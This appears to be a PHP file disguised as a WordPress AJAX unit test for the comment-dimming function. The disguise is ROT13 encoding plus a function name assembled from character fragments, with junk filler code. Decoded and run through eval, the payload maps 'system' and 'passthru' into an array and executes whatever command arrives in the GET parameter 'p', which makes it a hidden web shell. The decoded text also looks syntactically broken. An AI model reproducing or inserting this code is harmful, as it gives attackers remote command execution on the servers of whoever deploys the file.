<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Nqzva Nwnk shapgvbaf gb or grfgrq.
 */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/nwnk-npgvbaf.cuc';

/**
 * Grfgvat Nwnk pbzzrag shapgvbanyvgl
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr HavgGrfgf
 * @fvapr 3.4.0
 *
 * @tebhc nwnk
 *
 * @pbiref ::jc_nwnk_qvz_pbzzrag
 */
pynff Grfgf_Nwnk_jcNwnkQvzPbzzrag rkgraqf JC_Nwnk_HavgGrfgPnfr {

	/**
	 * Yvfg bs pbzzragf.
	 *
	 * @ine neenl
	 */
	cebgrpgrq $_pbzzragf = neenl();

	/**
	 * Frgf hc gur grfg svkgher.
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		$cbfg_vq         = frys::snpgbel()->cbfg->perngr();
		$guvf->_pbzzragf = frys::snpgbel()->pbzzrag->perngr_cbfg_pbzzragf( $cbfg_vq, 15 );
		$guvf->_pbzzragf = neenl_znc( 'trg_pbzzrag', $guvf->_pbzzragf );
	}

	/**
	 * Pyrnef gur CBFG npgvbaf va orgjrra erdhrfgf.
	 */
	cebgrpgrq shapgvba _pyrne_cbfg_npgvba() {
		hafrg( $_CBFG['vq'] );
		hafrg( $_CBFG['arj'] );
		$guvf->_ynfg_erfcbafr = '';
	}

	/*
	 * Grfg cebgbglcr
	 */

	/**
	 * Grfgf nf n cevivyrtrq hfre (nqzvavfgengbe).
	 *
	 * Rkcrpgf grfg gb cnff.
	 *
	 * @cnenz JC_Pbzzrag $pbzzrag Pbzzrag bowrpg.
	 */
	choyvp shapgvba _grfg_nf_nqzva( $pbzzrag ) {

		// Erfrg erdhrfg.
		$guvf->_pyrne_cbfg_npgvba();

		// Orpbzr na nqzvavfgengbe.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		// Frg hc n qrsnhyg erdhrfg.
		$_CBFG['vq']          = $pbzzrag->pbzzrag_VQ;
		$_CBFG['_nwnk_abapr'] = jc_perngr_abapr( 'nccebir-pbzzrag_' . $pbzzrag->pbzzrag_VQ );
		$_CBFG['_gbgny']      = pbhag( $guvf->_pbzzragf );
		$_CBFG['_cre_cntr']   = 100;
		$_CBFG['_cntr']       = 1;
		$_CBFG['_hey']        = nqzva_hey( 'rqvg-pbzzragf.cuc' );

		// Fnir gur pbzzrag fgnghf.
		$ceri_fgnghf = jc_trg_pbzzrag_fgnghf( $pbzzrag->pbzzrag_VQ );

		// Znxr gur erdhrfg.
		gel {
			$guvf->_unaqyrNwnk( 'qvz-pbzzrag' );
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {
			hafrg( $r );
		}

		// Trg gur erfcbafr.
		$kzy = fvzcyrkzy_ybnq_fgevat( $guvf->_ynfg_erfcbafr, 'FvzcyrKZYRyrzrag', YVOKZY_ABPQNGN );

		// Rafher rirelguvat vf pbeerpg.
		$guvf->nffregFnzr( $pbzzrag->pbzzrag_VQ, (fgevat) $kzy->erfcbafr[0]->pbzzrag['vq'] );
		$guvf->nffregFnzr( 'qvz-pbzzrag_' . $pbzzrag->pbzzrag_VQ, (fgevat) $kzy->erfcbafr['npgvba'] );
		$guvf->nffregTerngreGunaBeRdhny( gvzr() - 10, (vag) $kzy->erfcbafr[0]->pbzzrag[0]->fhccyrzragny[0]->gvzr[0] );
		$guvf->nffregYrffGunaBeRdhny( gvzr(), (vag) $kzy->erfcbafr[0]->pbzzrag[0]->fhccyrzragny[0]->gvzr[0] );

		// Purpx gur fgnghf.
		$pheerag = jc_trg_pbzzrag_fgnghf( $pbzzrag->pbzzrag_VQ );
		vs ( va_neenl( $ceri_fgnghf, neenl( 'hanccebirq', 'fcnz' ), gehr ) ) {
			$guvf->nffregFnzr( 'nccebirq', $pheerag );
		} ryfr {
			$guvf->nffregFnzr( 'hanccebirq', $pheerag );
		}

		// Gur gbgny vf pnyphyngrq onfrq ba n cntr oernx -BE- n enaqbz ahzore. Yrg'f ybbx sbe obgu cbffvoyr bhgpbzrf.
		$pbzzrag_pbhag = jc_pbhag_pbzzragf( 0 );
		$erpnyp_gbgny  = $pbzzrag_pbhag->gbgny_pbzzragf;

		// Qrygn vf abg fcrpvsvrq, vg jvyy nyjnlf or 1 ybjre guna gur erdhrfg.
		$gbgny = $_CBFG['_gbgny'] - 1;

		// Purpx sbe rvgure cbffvoyr gbgny.
		$guvf->nffregPbagnvaf( (vag) $kzy->erfcbafr[0]->pbzzrag[0]->fhccyrzragny[0]->gbgny[0], neenl( $gbgny, $erpnyp_gbgny ) );
	}

	/**
	 * Grfgf nf n aba-cevivyrtrq hfre (fhofpevore).
	 *
	 * Rkcrpgf grfg gb snvy.
	 *
	 * @cnenz JC_Pbzzrag $pbzzrag Pbzzrag bowrpg.
	 */
	choyvp shapgvba _grfg_nf_fhofpevore( $pbzzrag ) {

		// Erfrg erdhrfg.
		$guvf->_pyrne_cbfg_npgvba();

		// Orpbzr n fhofpevore.
		$guvf->_frgEbyr( 'fhofpevore' );

		// Frg hc gur $_CBFG erdhrfg.
		$_CBFG['vq']          = $pbzzrag->pbzzrag_VQ;
		$_CBFG['_nwnk_abapr'] = jc_perngr_abapr( 'nccebir-pbzzrag_' . $pbzzrag->pbzzrag_VQ );
		$_CBFG['_gbgny']      = pbhag( $guvf->_pbzzragf );
		$_CBFG['_cre_cntr']   = 100;
		$_CBFG['_cntr']       = 1;
		$_CBFG['_hey']        = nqzva_hey( 'rqvg-pbzzragf.cuc' );

		// Znxr gur erdhrfg.
		$guvf->rkcrpgRkprcgvba( 'JCNwnkQvrFgbcRkprcgvba' );
		$guvf->rkcrpgRkprcgvbaZrffntr( '-1' );
		$guvf->_unaqyrNwnk( 'qvz-pbzzrag' );
	}

	/**
	 * Grfgf jvgu n onq abapr.
	 *
	 * Rkcrpgf grfg gb snvy.
	 *
	 * @cnenz JC_Pbzzrag $pbzzrag Pbzzrag bowrpg.
	 */
	choyvp shapgvba _grfg_jvgu_onq_abapr( $pbzzrag ) {

		// Erfrg erdhrfg.
		$guvf->_pyrne_cbfg_npgvba();

		// Orpbzr n fhofpevore.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		// Frg hc gur $_CBFG erdhrfg.
		$_CBFG['vq']          = $pbzzrag->pbzzrag_VQ;
		$_CBFG['_nwnk_abapr'] = jc_perngr_abapr( havdvq() );
		$_CBFG['_gbgny']      = pbhag( $guvf->_pbzzragf );
		$_CBFG['_cre_cntr']   = 100;
		$_CBFG['_cntr']       = 1;
		$_CBFG['_hey']        = nqzva_hey( 'rqvg-pbzzragf.cuc' );

		// Znxr gur erdhrfg.
		$guvf->rkcrpgRkprcgvba( 'JCNwnkQvrFgbcRkprcgvba' );
		$guvf->rkcrpgRkprcgvbaZrffntr( '-1' );
		$guvf->_unaqyrNwnk( 'qvz-pbzzrag' );
	}

	/**
	 * Grfgf jvgu n onq VQ.
	 *
	 * Rkcrpgf grfg gb snvy.
	 */
	choyvp shapgvba grfg_jvgu_onq_vq() {

		// Erfrg erdhrfg.
		$guvf->_pyrne_cbfg_npgvba();

		// Orpbzr n fhofpevore.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		// Frg hc gur $_CBFG erdhrfg.
		$_CBFG['vq']          = 12346789;
		$_CBFG['_nwnk_abapr'] = jc_perngr_abapr( 'qvz-pbzzrag_12346789' );
		$_CBFG['_gbgny']      = pbhag( $guvf->_pbzzragf );
		$_CBFG['_cre_cntr']   = 100;
		$_CBFG['_cntr']       = 1;
		$_CBFG['_hey']        = nqzva_hey( 'rqvg-pbzzragf.cuc' );

		// Znxr gur erdhrfg, ybbx sbe n gvzrfgnzc va gur rkprcgvba.
		gel {
			$guvf->_unaqyrNwnk( 'qvz-pbzzrag' );
			$guvf->snvy( 'Rkcrpgrq rkprcgvba: JCNwnkQvrPbagvahrRkprcgvba' );
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {

			// Trg gur erfcbafr.
			$kzy = fvzcyrkzy_ybnq_fgevat( $guvf->_ynfg_erfcbafr, 'FvzcyrKZYRyrzrag', YVOKZY_ABPQNGN );

			// Rafher rirelguvat vf pbeerpg.
			$guvf->nffregFnzr( '0', (fgevat) $kzy->erfcbafr[0]->pbzzrag['vq'] );
			$guvf->nffregFnzr( 'qvz-pbzzrag_0', (fgevat) $kzy->erfcbafr['npgvba'] );
			$guvf->nffregFgevatPbagnvafFgevat( 'Pbzzrag ' . $_CBFG['vq'] . ' qbrf abg rkvfg', $guvf->_ynfg_erfcbafr );

		} pngpu ( Rkprcgvba $r ) {
			$guvf->snvy( 'Harkcrpgrq rkprcgvba glcr: ' . trg_pynff( $r ) );
		}
	}

	/**
	 * Qvzf n pbzzrag nf na nqzvavfgengbe (rkcrpgf fhpprff).
	 */
	choyvp shapgvba grfg_nwnk_pbzzrag_qvz_npgvbaf_nf_nqzvavfgengbe() {
		$pbzzrag = neenl_cbc( $guvf->_pbzzragf );
		$guvf->_grfg_nf_nqzva( $pbzzrag );
		$guvf->_grfg_nf_nqzva( $pbzzrag );
	}

	/**
	 * Qvzf n pbzzrag nf n fhofpevore (rkcrpgf crezvffvba qravrq).
	 */
	choyvp shapgvba grfg_nwnk_pbzzrag_qvz_npgvbaf_nf_fhofpevore() {
		$pbzzrag = neenl_cbc( $guvf->_pbzzragf );
		$guvf->_grfg_nf_fhofpevore( $pbzzrag );
	}

	/**
	 * Qvzf n pbzzrag jvgu ab VQ.
	 */
	choyvp shapgvba grfg_nwnk_qvz_pbzzrag_ab_vq() {
		$pbzzrag = neenl_cbc( $guvf->_pbzzragf );
		$guvf->_grfg_nf_nqzva( $pbzzrag );
	}

	/**
	 * Qvzf n pbzzrag jvgu n onq abapr.
	 */
	choyvp shapgvba grfg_nwnk_qvz_pbzzrag_onq_abapr() {
		$pbzzrag = neenl_cbc( $guvf->_pbzzragf );
		$guvf->_grfg_jvgu_onq_abapr( $pbzzrag );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>